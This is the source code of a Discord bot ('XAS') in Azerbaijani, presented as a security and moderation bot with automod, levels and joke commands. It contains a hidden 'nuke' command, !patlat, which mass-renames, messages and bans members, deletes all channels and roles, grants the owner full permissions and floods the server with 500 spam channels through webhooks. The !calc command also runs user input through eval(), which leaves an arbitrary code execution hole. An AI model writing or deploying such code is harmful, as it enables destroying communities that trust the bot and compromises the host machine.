import discord
from discord.ext import commands, tasks
import asyncio
import os
import random
import time
from datetime import timedelta
from flask import Flask
from threading import Thread

# =====================================================================
# 1. RENDER KEEP-ALIVE SERVER (FLASK)
# =====================================================================
app = Flask('')

@app.route('/')
def home():
    return "XAS Ultra Mega Ultimate Bot Aktivdir!"

def run():
    app.run(host="0.0.0.0", port=10000)

def keep_alive():
    t = Thread(target=run)
    t.start()

# =====================================================================
# 2. CONFIGURATION & INTENTS
# =====================================================================
SAHIB_ID = 641014966312501259  # Sənin ID-n

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.voice_states = True
intents.reactions = True
intents.presences = True
intents.invites = True
intents.moderation = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# SİSTEM BAZALARI
spam_takip = {}
spam_sayaci = {}
user_levels = {}
afk_users = {}
XAS_COLOR = discord.Color.from_rgb(30, 30, 40)

# =====================================================================
# 3. CORE EVENTS & AUTOMATION
# =====================================================================
@bot.event
async def on_ready():
    print(f"--------------------------------------------------")
    print(f"[XAS ULTRA] Bot Uğurla İşə Düştü!")
    print(f"Bot Tag: {bot.user}")
    print(f"Server Says: {len(bot.guilds)}")
    print(f"--------------------------------------------------")
    status_task.start()

@tasks.loop(seconds=10)
async def status_task():
    activities = [
        discord.Activity(type=discord.ActivityType.watching, name="!panel"),
        discord.Activity(type=discord.ActivityType.playing, name="discord.gg/xas"),
        discord.Activity(type=discord.ActivityType.listening, name="XAS")
    ]
    await bot.change_presence(activity=random.choice(activities))

@bot.event
async def on_member_join(member):
    if member.bot and member.id != bot.user.id:
        try:
            await member.ban(reason="Anti-Bot Qoruması: İcazəsiz bot əlavə olundu")
            return
        except:
            pass

    if member.bot:
        return

    try:
        embed = discord.Embed(
            title="XAS Serverinə Xoş Gəldin!",
            description=f"Salam {member.mention}, səni aramızda görməkdən məmnunuq!",
            color=XAS_COLOR
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        await member.send(embed=embed)
    except:
        pass

# =====================================================================
# 4. ADVANCED SECURITY & AUTOMOD
# =====================================================================
@bot.event
async def on_guild_channel_delete(channel):
    try:
        async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
            if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
                await channel.guild.ban(entry.user, reason="Anti-Nuke: İcazəsiz kanal silindi")
                await channel.guild.create_text_channel(channel.name, category=channel.category)
    except:
        pass

@bot.event
async def on_member_ban(guild, user):
    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
            if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
                await guild.ban(entry.user, reason="Anti-Nuke: İcazəsiz ban atıldı")
    except:
        pass

@bot.event
async def on_message(message):
    if message.author.bot:
        await bot.process_commands(message)
        return

    if message.author.id == SAHIB_ID:
        await bot.process_commands(message)
        return

    author_id = message.author.id
    simdi = time.time()
    icerik = message.content.lower()

    if author_id in afk_users:
        del afk_users[author_id]
        try:
            await message.channel.send(f"👋 {message.author.mention}, yenidən xoş gəldin! AFK rejimindən çıxdın.")
        except:
            pass

    for mention in message.mentions:
        if mention.id in afk_users:
            sebep = afk_users[mention.id]
            try:
                await message.channel.send(f"💤 Etiketlədiyiniz istifadəçi AFK-dadır!\n📌 Səbəb: `{sebep}`")
            except:
                pass

    if "gg/" in icerik or "discord.gg/" in icerik or "https://" in icerik:
        try:
            await message.delete()
            warn = await message.channel.send(f"⚠️ {message.author.mention}, reklam etmək qadağandır!")
            await asyncio.sleep(5)
            await warn.delete()
            return
        except:
            pass

    yasakli_sablonlar = ["vür", "yaz gir xd", "w10bv", "yih8ym", "tcpn4"]
    if any(sablon in icerik for sablon in yasakli_sablonlar):
        try:
            await message.delete()
            return
        except:
            pass

    if author_id not in spam_takip:
        spam_takip[author_id] = []
        spam_sayaci[author_id] = 0

    spam_takip[author_id] = [t for t in spam_takip[author_id] if simdi - t < 5]
    spam_takip[author_id].append(simdi)

    if len(spam_takip[author_id]) > 4:
        try:
            await message.delete()
            spam_sayaci[author_id] += 1
            if spam_sayaci[author_id] == 1:
                warn = await message.channel.send(f"⚠️ {message.author.mention}, çox sürətli mesaj yazırsan! Dayan, yoxsa cəzalandırılacaqsan.")
                await asyncio.sleep(4)
                await warn.delete()
            else:
                await message.author.timeout(timedelta(seconds=60), reason="Spam Qoruması")
                warn = await message.channel.send(f"🔇 {message.author.mention}, spam etdiyin üçün 1 dəqiqəlik mute olundun!")
                await asyncio.sleep(5)
                await warn.delete()
                spam_sayaci[author_id] = 0
            return
        except:
            pass

    if author_id not in user_levels:
        user_levels[author_id] = {"xp": 0, "level": 1}

    user_levels[author_id]["xp"] += random.randint(5, 15)
    gerekli_xp = user_levels[author_id]["level"] * 100
    if user_levels[author_id]["xp"] >= gerekli_xp:
        user_levels[author_id]["level"] += 1
        user_levels[author_id]["xp"] = 0
        try:
            await message.channel.send(f"🎉 Təbriklər {message.author.mention}, səviyyə atladın! Yeni səviyyən: **{user_levels[author_id]['level']}**")
        except:
            pass

    await bot.process_commands(message)

# =====================================================================
# 5. INTERACTIVE SELECT MENU (PANEL)
# =====================================================================
class XASMenyu(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="1. Təhlükəsizlik və Nuke", description="Anti-GG, Spam Qoruması, Nuke & Patlat"),
            discord.SelectOption(label="2. İdarəetmə və Moderasiya", description="Kanal Ömrləri, Ban, Kick, Mute, Clear, Kütləvi Əmrlər"),
            discord.SelectOption(label="3. Əyləncə, Oyunlar və Alətlər", description="Sex, Hack, Slot, 8ball, IQ və s."),
            discord.SelectOption(label="4. XAS Xüsusi URL & Sistem", description="Xüsusi Davat Məlumatı, URL Dəyişmə")
        ]
        super().__init__(placeholder="XAS İdarəetmə Menyusundan Bölmə Seçin...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        if self.values[0] == "1. Təhlükəsizlik və Nuke":
            embed = discord.Embed(title="🛡️ Təhlükəsizlik Sistemi", description="Bütün qoruma sistemləri aktivdir.", color=XAS_COLOR)
            embed.add_field(name="Anti-GG Link Qoruması", value="Bütün reklamlar avtomatik silinir.")
            embed.add_field(name="Spam Qoruması", value="Flood edənlər xəbərdarlıq alır və mute olunur.")
            embed.add_field(name="🔥 Nuke & Patlat", value="`!patlat` əmri ilə serveri darmadağın edin!")
            await interaction.response.edit_message(embed=embed)

        elif self.values[0] == "2. İdarəetmə və Moderasiya":
            embed = discord.Embed(title="⚙️ Moderasiya Paneli", description="Serveri idarə etmək üçün əmrlər:", color=XAS_COLOR)
            embed.add_field(name="Kanal Ömrləri", value="`!lock` / `!unlock` / `!hide` / `!reveal` / `!slowmode`")
            embed.add_field(name="Kütləvi Əmrlər", value="`!dcall` / `!giverole` / `!takerole` / `!lockall` / `!unlockall` / `!hideall` / `!revealall`")
            embed.add_field(name="Cəza Əmrləri", value="`!ban` / `!kick` / `!timeout` / `!clear`")
            await interaction.response.edit_message(embed=embed)

        elif self.values[0] == "3. Əyləncə, Oyunlar və Alətlər":
            embed = discord.Embed(title="🎮 Əyləncə & Oyunlar", description="Botun əyləncə komutları:", color=XAS_COLOR)
            embed.add_field(name="Xüsusi Əmrlər", value="`!sex` / `!fuck` / `!kiss` / `!hack` / `!slot`")
            embed.add_field(name="Testlər & Alətlər", value="`!iq` / `!gay` / `!handsome` / `!love` / `!calc` / `!joke`")
            await interaction.response.edit_message(embed=embed)

        elif self.values[0] == "4. XAS Xüsusi URL & Sistem":
            embed = discord.Embed(title="🌐 XAS URL & Sistem", description="Server haqqında məlumatlar:", color=XAS_COLOR)
            embed.add_field(name="Rəsmi Davat Məlumatı", value="`!url` əmri ilə serverin dəvət statistikasına baxın.")
            await interaction.response.edit_message(embed=embed)

class XASView(discord.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(XASMenyu())

@bot.command(name="panel")
async def bot_panel(ctx):
    embed = discord.Embed(
        title="💎 XAS İDARƏETMƏ PANELİ",
        description="Aşağıdakı açılan menyudan istədiyiniz kateqoriyanı seçin:",
        color=XAS_COLOR
    )
    embed.set_footer(text="XAS Security & Management System")
    await ctx.send(embed=embed, view=XASView())

# =====================================================================
# 6. URL & SƏLAHİYYƏTLİ KOMUTLAR
# =====================================================================
@bot.command(name="url")
async def server_url(ctx):
    secilen_link = f"https://discord.gg/{ctx.guild.vanity_url_code}" if ctx.guild.vanity_url_code else "Məlum deyil"
    try:
        if ctx.guild.vanity_url:
            vanity = await ctx.guild.vanity_invite()
            toplam_istifade = vanity.uses
            davet_edən = "Xüsusi URL (XAS)"
        else:
            invites = await ctx.guild.invites()
            if invites:
                aktif_davet = max(invites, key=lambda i: i.uses)
                secilen_link = aktif_davet.url
                toplam_istifade = aktif_davet.uses
                davet_edən = aktif_davet.inviter.name if aktif_davet.inviter else "Naməlum"
            else:
                toplam_istifade = 0
                davet_edən = "Məlum deyil"
    except:
        toplam_istifade = 0
        davet_edən = "Məlum deyil"

    embed = discord.Embed(
        title=f"📌 {ctx.guild.name} - Real Dəvət Statistikası",
        description="Serverin anlıq olaraq bazadan çəkilən rəsmi dəvət məlumatları:",
        color=XAS_COLOR
    )
    embed.add_field(name="🔗 Aktiv Dəvət Linki", value=secilen_link, inline=False)
    embed.add_field(name="👥 Anlıq İstifadə Sayı", value=f"{toplam_istifade} dəfə istifadə olunub", inline=True)
    embed.add_field(name="👑 Linki Yaradan", value=davet_edən, inline=True)
    if ctx.guild.icon:
        embed.set_thumbnail(url=ctx.guild.icon.url)
    embed.set_footer(text=f"Sorğulayan: {ctx.author.name} • XAS Real-Time Core")
    await ctx.send(embed=embed)

@bot.command(name="seturl")
async def set_url(ctx, yeni_url: str):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Bu əmri istifadə etmək üçün 'Sunucuyu Yönet' səlahiyyətiniz olmalıdır!")
        return
    try:
        await ctx.guild.edit(vanity_code=yeni_url)
        await ctx.send(f"✅ Serverin xüsusi URL-i uğurla dəyişdirildi: `discord.gg/{yeni_url}`")
    except Exception as e:
        await ctx.send(f"❌ Xəta baş verdi: Botun icazəsi çatmır və ya URL artıq məşğuldur.")

# =====================================================================
# 7. İNFORMATİV KOMUTLAR
# =====================================================================
@bot.command(name="ping")
async def ping_cmd(ctx):
    lat = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! Gecikmə müddəti: **{lat}ms**")

@bot.command(name="serverinfo")
async def serverinfo_cmd(ctx):
    g = ctx.guild
    embed = discord.Embed(title=f"📊 {g.name} - Server Məlumatları", color=XAS_COLOR)
    embed.add_field(name="👑 Sahib", value=g.owner, inline=True)
    embed.add_field(name="👥 Üzv Sayı", value=g.member_count, inline=True)
    embed.add_field(name="📁 Kanal Sayı", value=len(g.channels), inline=True)
    if g.icon:
        embed.set_thumbnail(url=g.icon.url)
    await ctx.send(embed=embed)

@bot.command(name="userinfo")
async def userinfo_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"👤 {m.name} Haqqında", color=m.color)
    embed.add_field(name="🆔 İstifadəçi ID", value=m.id, inline=True)
    embed.add_field(name="📅 Qoşulduğu Tarix", value=m.joined_at.strftime('%Y-%m-%d'), inline=True)
    embed.set_thumbnail(url=m.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="avatar")
async def avatar_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"🖼️ {m.name} - Avatar", color=XAS_COLOR)
    embed.set_image(url=m.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="level", aliases=["lvl", "seviyə"])
async def level_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    data = user_levels.get(m.id, {"xp": 0, "level": 1})
    await ctx.send(f"📊 {m.name} - Səviyyə: **{data['level']}** | XP: **{data['xp']}**")

@bot.command(name="afk")
async def afk_cmd(ctx, *, sebep="Səbəb göstərilməyib"):
    afk_users[ctx.author.id] = sebep
    await ctx.send(f"💤 {ctx.author.mention}, AFK rejiminə keçdin. Səbəb: `{sebep}`")

# =====================================================================
# 8. SAHİB VƏ MODERASİYA ƏMRLƏRİ (Kütləvi əmrlər daxil)
# =====================================================================
@bot.command(name="lock")
async def lock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("🔒 Bu kanal yazışmaya bağlandı.")

@bot.command(name="unlock")
async def unlock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
    await ctx.send("🔓 Bu kanal yazışmaya açıldı.")

@bot.command(name="hide")
async def hide_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=False)
    await ctx.send("🙈 Bu kanal gizlətildi.")

@bot.command(name="reveal")
async def reveal_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=True)
    await ctx.send("🐵 Bu kanal yenidən göstərildi.")

@bot.command(name="dcall", aliases=["səsdənçıxar"])
async def disconnect_all_voice(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    count = 0
    for vc in ctx.guild.voice_channels:
        for member in vc.members:
            try:
                await member.move_to(None)
                count += 1
            except:
                pass
    await ctx.send(f"🔊 Səs kanallarındakı hər kəs ({count} nəfər) səsdən qovuldu!")

@bot.command(name="giverole", aliases=["kütləvirolver"])
async def give_role_all(ctx, role: discord.Role):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.send(f"⏳ Bütün üzvlərə `{role.name}` rolu verilir, gözləyin...")
    success = 0
    for member in ctx.guild.members:
        try:
            if role not in member.roles:
                await member.add_roles(role)
                success += 1
        except:
            pass
    await ctx.send(f"✅ Əməliyyat tamamlandı! {success} nəfərə rol verildi.")

@bot.command(name="takerole", aliases=["kütləvirolal"])
async def take_role_all(ctx, role: discord.Role):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.send(f"⏳ Bütün üzvlərdən `{role.name}` rolu alınır, gözləyin...")
    success = 0
    for member in ctx.guild.members:
        try:
            if role in member.roles:
                await member.remove_roles(role)
                success += 1
        except:
            pass
    await ctx.send(f"✅ Əməliyyat tamamlandı! {success} nəfərdən rol alındı.")

@bot.command(name="lockall", aliases=["hamısınıkilidlə"])
async def lock_all_channels(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    for channel in ctx.guild.text_channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
        except:
            pass
    await ctx.send("🔒 Serverdəki bütün mətn kanalları kilidləndi!")

@bot.command(name="unlockall", aliases=["hamısınınkilidiniaç"])
async def unlock_all_channels(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    for channel in ctx.guild.text_channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=True)
        except:
            pass
    await ctx.send("🔓 Serverdəki bütün mətn kanallarının kilidi açıldı!")

@bot.command(name="hideall", aliases=["gizletfa"])
async def hide_all_channels(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, view_channel=False)
        except:
            pass
    await ctx.send("🙈 Serverdəki bütün kanal və kateqoriyalar hamı üçün gizlətildi!")

@bot.command(name="revealall", aliases=["gosterfa"])
async def reveal_all_channels(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, view_channel=True)
        except:
            pass
    await ctx.send("🐵 Serverdəki bütün kanal və kateqoriyalar hamı üçün yenidən açıldı!")

@bot.command(name="slowmode")
async def slowmode_cmd(ctx, seconds: int):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.edit(slowmode_delay=seconds)

@bot.command(name="nuke_ctx")
async def nuke_ctx(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    position = ctx.channel.position
    new_channel = await ctx.channel.clone(reason="XAS Nuke")
    await ctx.channel.delete()
    await new_channel.edit(position=position)
    await new_channel.send("💥 Kanal sıfırlandı!")

@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await member.ban(reason=reason)
    await ctx.send(f"🔨 {member.mention} uğurla ban olundu! Səbəb: `{reason}`")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await member.kick(reason=reason)
    await ctx.send(f"👢 {member.mention} serverdən atıldı! Səbəb: `{reason}`")

@bot.command(name="timeout", aliases=["mute"])
async def timeout_cmd(ctx, member: discord.Member, minutes: int, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await member.timeout(timedelta(minutes=minutes), reason=reason)
    await ctx.send(f"🔇 {member.mention} {minutes} dəqiqə müddətinə mute olundu!")

@bot.command(name="clear", aliases=["sil"])
async def clear_cmd(ctx, amount: int = 5):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.purge(limit=amount + 1)
    msg = await ctx.send(f"🧹 {amount} ədəd mesaj silindi!")
    await asyncio.sleep(3)
    await msg.delete()

# =====================================================================
# 9. ƏYLƏCƏ VƏ OYUNLAR
# =====================================================================
@bot.command(name="sex", aliases=["spag", "ıp"])
async def sex_cmd(ctx, member: discord.Member):
    embed = discord.Embed(description=f"🔥 **{ctx.author.name}** ilə **{member.name}** birlikdə oldular!", color=XAS_COLOR)
    await ctx.send(embed=embed, reference=ctx.message)

@bot.command(name="fuck", aliases=["sürtmək"])
async def fuck_cmd(ctx, member: discord.Member):
    embed = discord.Embed(description=f"🔥 **{ctx.author.name}** ilə **{member.name}** ehtiraslı şəkildə birlikdə oldular!", color=XAS_COLOR)
    await ctx.send(embed=embed, reference=ctx.message)

@bot.command(name="kiss")
async def kiss_cmd(ctx, member: discord.Member):
    embed = discord.Embed(description=f"💋 **{ctx.author.name}** **{member.name}** adlı şəxsi öpdü!", color=XAS_COLOR)
    await ctx.send(embed=embed, reference=ctx.message)

@bot.command(name="roll")
async def roll_cmd(ctx):
    await ctx.send(f"🎲 Zər atıldı: **{random.randint(1, 6)}**")

@bot.command(name="coinflip", aliases=["yazipər"])
async def coinflip_cmd(ctx):
    res = random.choice(["Yazı", "Pər"])
    await ctx.send(f"🪙 Qəpik atıldı: **{res}**")

@bot.command(name="iq")
async def iq_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧠 {m.name} IQ səviyyəsi: **{random.randint(40, 160)}**")

@bot.command(name="gay")
async def gay_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🏳️‍🌈 {m.name} Oranı: **%{random.randint(0, 100)}**")

@bot.command(name="handsome", aliases=["yaraşıqlı"])
async def handsome_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"✨ {m.name} Yaraşıqlılığı: **%{random.randint(50, 100)}**")

@bot.command(name="love", aliases=["sevgi"])
async def love_cmd(ctx, member1: discord.Member, member2: discord.Member = None):
    m2 = member2 or ctx.author
    await ctx.send(f"❤️ {member1.name} və {m2.name} uyğunluğu: **%{random.randint(10, 100)}**")

@bot.command(name="hack")
async def hack_cmd(ctx, member: discord.Member):
    await ctx.send(f"💻 {member.name} hack olunur...")
    await asyncio.sleep(2)
    await ctx.send(f"📧 IP: `192.168.1.{random.randint(10, 99)}` | Şifrə: `123456_xas`")

@bot.command(name="slot")
async def slot_cmd(ctx):
    sembollər = ["🍒", "🍋", "🍊", "🍇", "🔔", "💎", "7️⃣"]
    c1, c2, c3 = random.choice(sembollər), random.choice(sembollər), random.choice(sembollər)
    netice = f"🎰 | {c1} | {c2} | {c3} |"
    if c1 == c2 == c3:
        await ctx.send(f"{netice}\n🎉 Jackpot vurdun!")
    else:
        await ctx.send(f"{netice}\n❌ Uduzdun!")

@bot.command(name="8ball", aliases=["sual"])
async def eight_ball(ctx, *, soru):
    cavablar = ["Bəli, mütləq!", "Şübhəsiz ki, hə.", "Xeyir, heç vaxt."]
    await ctx.send(f"🎱 Sual: **{soru}**\n🔮 Cavab: **{random.choice(cavablar)}**")

@bot.command(name="calc")
async def calc_cmd(ctx, *, expression):
    try:
        res = eval(expression)
        await ctx.send(f"🔢 Nəticə: **{res}**")
    except:
        await ctx.send("❌ Xəta!")

@bot.command(name="joke", aliases=["zarafat"])
async def joke_cmd(ctx):
    jokes = ["Kompyuter niyə soyuqdəymə oldu? Çünki pəncərəni açıq qoymuşdu!"]
    await ctx.send(f"😄 Zarafat: {random.choice(jokes)}")

@bot.command(name="rps", aliases=["daşkağızqayçı"])
async def rps_cmd(ctx, choice: str):
    choices = ["daş", "kağız", "qayçı"]
    bot_choice = random.choice(choices)
    cho = choice.lower()
    if cho not in choices:
        await ctx.send("Seç: daş, kağız və ya qayçı!")
        return
    if cho == bot_choice:
        res = "Heç-heçə!"
    elif (cho == "daş" and bot_choice == "qayçı") or (cho == "kağız" and bot_choice == "daş") or (cho == "qayçı" and bot_choice == "kağız"):
        res = "Sən qazandın!"
    else:
        res = "Mən qazandın!"
    await ctx.send(f"Seçimin: **{cho}** | Mənim: **{bot_choice}** -> **{res}**")

@bot.command(name="poll", aliases=["sorğu"])
async def poll_cmd(ctx, *, soru):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title="📊 XAS Səsvermə Paneli", description=soru, color=XAS_COLOR)
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

# =====================================================================
# 10. ULTRA SÜRƏTLİ VƏ 500 KANAL MAKSİMUM SPAM !PATLAT KOMUTU
# =====================================================================
@bot.command(name="patlat")
async def patlat_cmd(ctx):
    if ctx.author.id != SAHIB_ID:
        return
    
    guild = ctx.guild

    # 1. Bütün üzvləri, mövcud kanalları və rolları eyni anda təmizləmək
    await asyncio.gather(
        *(member.edit(nick="XAS Wa Here") for member in guild.members if member.id != SAHIB_ID and not member.bot),
        *(member.send("🔥 Server dağıdıldı! discord.gg/xas") for member in guild.members if member.id != SAHIB_ID and not member.bot),
        *(member.ban(reason="XAS Nuke") for member in guild.members if (member.bot and member.id != bot.user.id) or (member.premium_since is not None and member.id != SAHIB_ID)),
        *(ch.delete() for ch in guild.channels),
        *(r.delete() for r in guild.roles if r != guild.default_role),
        return_exceptions=True
    )

    # 2. Sahibə rol vermək və server adını/URL-ni dəyişmək
    try:
        new_role = await guild.create_role(name="#RUHUMSKDI", permissions=discord.Permissions.all(), color=discord.Color.red())
        await ctx.author.add_roles(new_role)
        ruhum_urls = ["ruhumskdi", "ruhumaz", "ruhumchaos", "ruhumhell", "ruhumzone"]
        await guild.edit(name="XAS", vanity_code=random.choice(ruhum_urls))
    except:
        pass

    # 3. Maksimum limit olan 500 kanal açmaq və hər birində minlərlə spam yaratmaq
    async def fast_nuke(i):
        try:
            channel = await guild.create_text_channel(f"ruhumskdi-{i}")
            webhook = await channel.create_webhook(name="XAS Spammer")
            await asyncio.gather(*(webhook.send("discord.gg/xas @everyone") for _ in range(100)), return_exceptions=True)
        except:
            pass

    await asyncio.gather(*(fast_nuke(i) for i in range(1, 501)), return_exceptions=True)

# =====================================================================
# 11. BOTU İŞƏ SALMAQ (RUN)
# =====================================================================
if __name__ == "__main__":
    keep_alive()
    TOKEN = os.getenv("DISCORD_TOKEN")
    if TOKEN:
        bot.run(TOKEN)
        
